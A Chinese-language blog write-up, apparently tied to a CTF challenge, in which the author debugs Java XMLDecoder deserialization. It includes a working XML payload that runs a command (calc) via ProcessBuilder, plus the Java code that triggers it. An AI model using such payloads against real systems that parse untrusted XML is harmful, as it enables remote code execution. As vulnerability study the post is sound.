# 前言

上周五看了`GKCTF`的`babycat`那题，接触了`XMLDecoder`的漏洞，看了几天还是没看太明白。。。太菜了呜呜。。所以这是第一篇，暂时分析到这里，前面的处理XML的流程没看明白，光写篇文章理一下后面的部分。等以后再来填坑了。

只是简单的记录自己的调试过程，非常失败，没搞太懂。



# 利用

利用就是，写一个这样的xml：

```xml
<java>
    <object class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="1">
            <void index="0">
                <string>calc</string>
            </void>
        </array>
        <void method="start"></void>
    </object>
</java>
```

触发：

```java
        try(FileInputStream fileInputStream = new FileInputStream("1.xml")){
            XMLDecoder xmlDecoder = new XMLDecoder(fileInputStream);
            Object o = xmlDecoder.readObject();
            System.out.println(o);
        }
```

![image-20210906213646200]([Java安全]XMLDecoder反序列化学习(一).assets/image-20210906213646200.png)



# 简单的分析

不算所谓的分析了，单纯的调试一下，看看后半部分的过程都干了什么。

从这个`endElement`开始调，勉强看懂了这部分的处理。

![image-20210907005809643]([Java安全]XMLDecoder反序列化学习(一).assets/image-20210907005809643.png)



也算是对`xml`的每一层进行处理了。

首先是对`localpart="string",rawname="string"`进行处理，也就是这里：`<string>calc</string>`。

跟进：

![image-20210907010009378]([Java安全]XMLDecoder反序列化学习(一).assets/image-20210907010009378.png)

接下来对xml的每一层进行处理基本就是跟这些函数了：

![image-20210907010110627]([Java安全]XMLDecoder反序列化学习(一).assets/image-20210907010110627.png)

得到`string`的值`calc`：

![image-20210907010144897]([Java安全]XMLDecoder反序列化学习(一).assets/image-20210907010144897.png)



然后调用了`this.parent.addArgument`，把这个值加给了`parent`的`argument`里面。



之后经过一些处理再次回到这里，这时候是对`void`进行处理了：

```xml
            <void index="0">
                
            </void>
```

接下来还是和处理`string`的流程类似了。一路跟进到`getValueObject`的时候，发现`length`为2，所以这里是`set`：

![image-20210907010753329]([Java安全]XMLDecoder反序列化学习(一).assets/image-20210907010753329.png)

之后再跟进到这里：

```java
            return ValueObjectImpl.create(var5.getValue());
```

进入`var5.getValue()`方法，发现有个`invoke`方法：

```java
    public Object getValue() throws Exception {
        if (value == unbound) {
            setValue(invoke());
        }
        return value;
    }
```

再跟进调试一下，最终在这里给`target`设置了值：

![image-20210907010948065]([Java安全]XMLDecoder反序列化学习(一).assets/image-20210907010948065.png)

之后的流程也差不多，之后是处理`array`：

```xml
        <array class="java.lang.String" length="1">

        </array>
```

然后就是`void`：

```xml
        <void method="start"></void>
```

最后处理到`object`：

```java
    <object class="java.lang.ProcessBuilder">
        
    </object>
```

其中对象用`new`产生，通过反射得到构造器然后调用。最终在这里通过反射调用了`start()`方法：

![image-20210907011420145]([Java安全]XMLDecoder反序列化学习(一).assets/image-20210907011420145.png)

太难了呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜。

# 参考链接

https://paper.seebug.org/916/

https://y4tacker.blog.csdn.net/article/details/118894375

https://www.freebuf.com/articles/network/247331.html

https://www.kingkk.com/2019/05/Weblogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/

https://xz.aliyun.com/t/5069













